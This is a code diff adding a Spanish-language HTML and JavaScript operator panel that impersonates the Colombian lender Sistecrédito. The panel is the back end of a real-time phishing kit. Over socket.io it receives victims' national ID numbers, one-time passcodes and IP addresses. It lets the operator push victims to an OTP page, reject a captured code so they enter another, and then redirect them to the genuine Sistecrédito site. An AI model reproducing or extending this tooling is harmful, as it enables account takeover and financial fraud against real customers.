@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Sistecrédito - Panel de Control</title>
+  <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800&display=swap" rel="stylesheet"/>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    :root {
+      --green: #2cc84d; --green-dark: #22a83e; --green-light: #e8f9e9;
+      --red: #e74c3c; --orange: #f39c12; --orange-dark: #d68910;
+      --blue: #3498db; --blue-dark: #2980b9;
+      --text-dark: #1a1a2e; --text-mid: #555; --text-light: #888;
+      --border: #d8dce5; --bg-page: #eef1f7; --white: #ffffff;
+    }
+    body { font-family: 'Nunito', sans-serif; background: var(--bg-page); min-height: 100vh; }
+    .page-wrapper { display: flex; flex-direction: column; min-height: 100vh; }
+    .header { background: var(--white); padding: 16px 20px; border-bottom: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 12px; }
+    .header-title { display: flex; align-items: center; gap: 12px; }
+    .header-title h1 { font-size: 1.25rem; font-weight: 800; }
+    .logo { width: 36px; height: 36px; background: var(--green); border-radius: 8px; display: flex; align-items: center; justify-content: center; }
+    .logo svg { width: 20px; height: 20px; stroke: white; fill: none; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; }
+    .header-right { display: flex; gap: 10px; flex-wrap: wrap; }
+    .badge { display: flex; align-items: center; gap: 6px; padding: 6px 12px; background: var(--bg-page); border-radius: 20px; font-size: 0.8rem; font-weight: 700; color: var(--text-mid); }
+    .badge .dot { width: 8px; height: 8px; border-radius: 50%; background: #ccc; }
+    .badge.on { color: var(--green-dark); } .badge.on .dot { background: var(--green); }
+    .main { flex: 1; padding: 20px 16px 60px; display: flex; flex-direction: column; align-items: center; gap: 16px; }
+    .sessions { width: 100%; max-width: 540px; display: flex; flex-direction: column; gap: 16px; }
+    .card { background: var(--white); border-radius: 20px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); overflow: hidden; animation: slideIn .3s ease; }
+    @keyframes slideIn { from{opacity:0;transform:translateY(-10px)} to{opacity:1;transform:translateY(0)} }
+    .card-head { display: flex; align-items: center; justify-content: space-between; padding: 14px 18px; background: linear-gradient(135deg,var(--bg-page),#e0e5ee); border-bottom: 1px solid var(--border); }
+    .card-info { display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
+    .num { width: 28px; height: 28px; border-radius: 50%; background: var(--green); color: white; display: flex; align-items: center; justify-content: center; font-size: .85rem; font-weight: 800; flex-shrink: 0; }
+    .status { font-size: .78rem; font-weight: 700; padding: 4px 10px; border-radius: 12px; }
+    .status.cargando { background: #e8f4fd; color: var(--blue-dark); animation: pulse 1.5s infinite; }
+    .status.validando { background: #fef3e2; color: var(--orange-dark); animation: pulse 1s infinite; }
+    .status.codigo_recibido { background: var(--green-light); color: var(--green-dark); }
+    .status.esperando_cedula { background: #fdeaea; color: var(--red); animation: pulse 1.5s infinite; }
+    .status.desconectado { background: #f0f0f0; color: #999; }
+    .status.finalizado { background: #1a1a2e; color: var(--green); }
+    @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.6} }
+    .ip-tag { font-size: .7rem; color: var(--text-light); background: var(--bg-page); padding: 2px 8px; border-radius: 10px; border: 1px solid var(--border); font-weight: 600; }
+    .btn-x { width: 28px; height: 28px; border-radius: 50%; background: transparent; border: 1px solid var(--border); color: var(--text-light); cursor: pointer; display: flex; align-items: center; justify-content: center; transition: all .2s; flex-shrink: 0; }
+    .btn-x:hover { background: var(--red); border-color: var(--red); color: white; }
+    .card-body { padding: 18px; }
+    .data-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 16px; }
+    .dc { background: var(--bg-page); border-radius: 12px; padding: 14px; border: 1px solid var(--border); }
+    .dc.hl { background: var(--green-light); border-color: var(--green); }
+    .dc-label { font-size: .7rem; font-weight: 700; color: var(--text-light); margin-bottom: 6px; text-transform: uppercase; letter-spacing: .3px; }
+    .dc-val { font-size: 1.05rem; font-weight: 800; color: var(--text-dark); min-height: 22px; word-break: break-all; }
+    .dc-val.empty { color: var(--text-light); font-style: italic; font-size: .85rem; font-weight: 600; }
+    .actions { display: grid; grid-template-columns: repeat(3,1fr); gap: 8px; margin-bottom: 14px; }
+    .abtn { display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 6px; padding: 12px 6px; border: none; border-radius: 14px; font-family: 'Nunito',sans-serif; font-size: .8rem; font-weight: 800; cursor: pointer; transition: all .2s; }
+    .abtn svg { width: 20px; height: 20px; }
+    .abtn:active { transform: scale(.96) !important; }
+    .abtn.relogin { background: var(--blue); color: white; }
+    .abtn.relogin:hover { background: var(--blue-dark); transform: translateY(-2px); }
+    .abtn.validacion { background: var(--orange); color: white; }
+    .abtn.validacion:hover { background: var(--orange-dark); transform: translateY(-2px); }
+    .abtn.finalizar { background: var(--green); color: white; }
+    .abtn.finalizar:hover { background: var(--green-dark); transform: translateY(-2px); }
+    .logs-wrap { padding-top: 14px; border-top: 1px solid var(--border); }
+    .logs-title { font-size: .72rem; font-weight: 800; color: var(--text-light); text-transform: uppercase; letter-spacing: .3px; margin-bottom: 8px; }
+    .logs { background: #1a1a2e; border-radius: 10px; padding: 10px; max-height: 90px; overflow-y: auto; font-family: 'Courier New',monospace; font-size: .68rem; line-height: 1.6; }
+    .log { color: #aaa; } .log.ok { color: #2ecc52; } .log.info { color: #3498db; }
+    .log.warn { color: #f39c12; } .log.err { color: #e74c3c; }
+    .log-t { color: #555; margin-right: 5px; }
+    .empty { text-align: center; padding: 60px 20px; }
+    .empty-icon { width: 70px; height: 70px; background: var(--bg-page); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 16px; }
+    .empty-icon svg { width: 36px; height: 36px; color: var(--text-light); }
+    .empty h2 { font-size: 1.05rem; font-weight: 800; margin-bottom: 6px; }
+    .empty p { font-size: .88rem; color: var(--text-mid); }
+    @media(min-width:768px){ .main{padding:32px 24px 60px;} .sessions{max-width:580px;} }
+  </style>
+</head>
+<body>
+<div class="page-wrapper">
+  <header class="header">
+    <div class="header-title">
+      <div class="logo"><svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg></div>
+      <h1>Panel de Control</h1>
+    </div>
+    <div class="header-right">
+      <div class="badge" id="connBadge"><span class="dot"></span><span id="connText">Conectando...</span></div>
+      <div class="badge"><span class="dot" style="background:var(--green)"></span><span id="sessionCount">0</span>&nbsp;sesiones</div>
+    </div>
+  </header>
+  <main class="main">
+    <div class="sessions" id="sessions">
+      <div class="empty" id="emptyState">
+        <div class="empty-icon">
+          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/>
+            <path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/>
+          </svg>
+        </div>
+        <h2>Esperando clientes...</h2>
+        <p>Cuando alguien ingrese su cédula aparecerá aquí.</p>
+      </div>
+    </div>
+  </main>
+</div>
+
+<script src="/socket.io/socket.io.js"></script>
+<script>
+  var socket = io();
+  var sessions = {};
+
+  socket.on('connect', function() {
+    socket.emit('panel_conectado');
+    var b = document.getElementById('connBadge');
+    b.classList.add('on');
+    document.getElementById('connText').textContent = 'Conectado';
+  });
+  socket.on('disconnect', function() {
+    document.getElementById('connBadge').classList.remove('on');
+    document.getElementById('connText').textContent = 'Desconectado';
+  });
+
+  socket.on('sesion_nueva', function(d) {
+    if (sessions[d.sessionId]) { updateUI(d.sessionId, d); return; }
+    sessions[d.sessionId] = { id: d.sessionId, number: d.number, cedula: d.cedula||'', codigo: d.codigo||'', status: d.status||'cargando', ip: d.ip||'—' };
+    renderCard(sessions[d.sessionId]);
+    addLog(d.sessionId, 'Sesión iniciada | Cédula: ' + d.cedula, 'ok');
+    document.getElementById('emptyState').style.display = 'none';
+    updateCount();
+  });
+
+  socket.on('sesion_actualizada', function(d) {
+    var s = sessions[d.sessionId];
+    if (!s) return;
+    if (d.cedula !== undefined) s.cedula = d.cedula;
+    if (d.codigo !== undefined) s.codigo = d.codigo;
+    if (d.status) s.status = d.status;
+    updateUI(d.sessionId, d);
+    if (d.codigo) addLog(d.sessionId, '🔑 Código: ' + d.codigo, 'ok');
+    if (d.status === 'esperando_cedula') addLog(d.sessionId, 'Esperando nueva cédula...', 'warn');
+    if (d.status === 'desconectado') addLog(d.sessionId, 'Cliente desconectado', 'err');
+  });
+
+  // Sesión finalizada: NO eliminar, solo marcar
+  socket.on('sesion_finalizada', function(d) {
+    var s = sessions[d.sessionId];
+    if (!s) return;
+    s.status = 'finalizado';
+    var st = document.getElementById('st_' + d.sessionId);
+    if (st) { st.textContent = 'Finalizado ✓'; st.className = 'status finalizado'; }
+    addLog(d.sessionId, '✅ Cliente redirigido', 'ok');
+  });
+
+  function updateUI(id, d) {
+    if (d.cedula !== undefined) {
+      var c = document.getElementById('ced_'+id);
+      if (c) { c.textContent = d.cedula || '—'; c.className = d.cedula ? 'dc-val' : 'dc-val empty'; }
+    }
+    if (d.codigo !== undefined) {
+      var co = document.getElementById('cod_'+id);
+      if (co) { co.textContent = d.codigo || '—'; co.className = d.codigo ? 'dc-val' : 'dc-val empty'; }
+    }
+    if (d.status) {
+      var st = document.getElementById('st_'+id);
+      if (st) {
+        var labels = { cargando:'Cargando', validando:'En validación', codigo_recibido:'Código recibido', esperando_cedula:'Esperando cédula', desconectado:'Desconectado', finalizado:'Finalizado ✓' };
+        st.textContent = labels[d.status] || d.status;
+        st.className = 'status ' + d.status;
+      }
+    }
+  }
+
+  function renderCard(s) {
+    var container = document.getElementById('sessions');
+    var div = document.createElement('div');
+    div.className = 'card'; div.id = s.id;
+    div.innerHTML =
+      '<div class="card-head">' +
+        '<div class="card-info">' +
+          '<span class="num">' + s.number + '</span>' +
+          '<span class="status cargando" id="st_' + s.id + '">Cargando</span>' +
+          '<span class="ip-tag">IP: ' + s.ip + '</span>' +
+        '</div>' +
+        '<button class="btn-x" onclick="removeCard(\'' + s.id + '\')" title="Cerrar">' +
+          '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>' +
+        '</button>' +
+      '</div>' +
+      '<div class="card-body">' +
+        '<div class="data-grid">' +
+          '<div class="dc hl"><p class="dc-label">Cédula</p><p class="dc-val" id="ced_' + s.id + '">' + (s.cedula || '<span class="empty">Esperando...</span>') + '</p></div>' +
+          '<div class="dc"><p class="dc-label">Código OTP</p><p class="dc-val empty" id="cod_' + s.id + '">Esperando...</p></div>' +
+        '</div>' +
+        '<div class="actions">' +
+          '<button class="abtn relogin" onclick="doRelogin(\'' + s.id + '\')">' +
+            '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M23 4v6h-6"/><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/></svg>Relogin' +
+          '</button>' +
+          '<button class="abtn validacion" onclick="doValidacion(\'' + s.id + '\')">' +
+            '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>Validación' +
+          '</button>' +
+          '<button class="abtn finalizar" onclick="doFinalizar(\'' + s.id + '\')">' +
+            '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg>Finalizar' +
+          '</button>' +
+        '</div>' +
+        '<div class="logs-wrap"><p class="logs-title">Registro</p><div class="logs" id="logs_' + s.id + '"></div></div>' +
+      '</div>';
+    container.appendChild(div);
+  }
+
+  function addLog(id, msg, type) {
+    var box = document.getElementById('logs_'+id);
+    if (!box) return;
+    var d = document.createElement('div');
+    d.className = 'log '+(type||'');
+    d.innerHTML = '<span class="log-t">['+new Date().toLocaleTimeString()+']</span>'+msg;
+    box.appendChild(d);
+    box.scrollTop = box.scrollHeight;
+  }
+
+  function updateCount() {
+    document.getElementById('sessionCount').textContent = Object.keys(sessions).length;
+  }
+
+  function removeCard(id) {
+    var el = document.getElementById(id);
+    if (el) el.remove();
+    delete sessions[id];
+    updateCount();
+    if (!Object.keys(sessions).length) document.getElementById('emptyState').style.display = '';
+  }
+
+  // ══ BOTONES ══
+
+  // RELOGIN: cliente vuelve al index
+  function doRelogin(id) {
+    var s = sessions[id]; if (!s) return;
+    socket.emit('panel_relogin', { sessionId: id });
+    addLog(id, '↩ Relogin ejecutado', 'warn');
+  }
+
+  // VALIDACIÓN:
+  // cargando/esperando_cedula → mandar a OTP por primera vez
+  // codigo_recibido O (validando con código) → código incorrecto
+  // validando sin código → ya está ahí esperando
+  function doValidacion(id) {
+    var s = sessions[id]; if (!s) return;
+
+    if (s.status === 'cargando' || s.status === 'esperando_cedula') {
+      if (!s.cedula) { addLog(id, '⚠ Sin cédula todavía', 'err'); return; }
+      socket.emit('panel_validacion', { sessionId: id });
+      addLog(id, '✉ Cliente enviado a validación', 'info');
+
+    } else if (s.status === 'codigo_recibido' || (s.status === 'validando' && s.codigo)) {
+      socket.emit('panel_codigo_invalido', { sessionId: id });
+      // Limpiar código localmente
+      s.codigo = '';
+      var co = document.getElementById('cod_'+id);
+      if (co) { co.textContent = 'Esperando...'; co.className = 'dc-val empty'; }
+      addLog(id, '❌ Código marcado inválido — cliente reintentará', 'err');
+
+    } else if (s.status === 'validando') {
+      addLog(id, 'ℹ Cliente ya en validación, esperando código...', 'warn');
+
+    } else {
+      addLog(id, 'ℹ Estado: ' + s.status, 'warn');
+    }
+  }
+
+  // FINALIZAR: redirigir cliente pero NO borrar sesión del panel
+  function doFinalizar(id) {
+    var s = sessions[id]; if (!s) return;
+    socket.emit('panel_finalizar', { sessionId: id, url: 'https://pagorapido.sistecredito.com/people/security' });
+    addLog(id, '✅ Finalizado — redirigido a Sistecrédito', 'ok');
+  }
+</script>
+</body>
+</html>
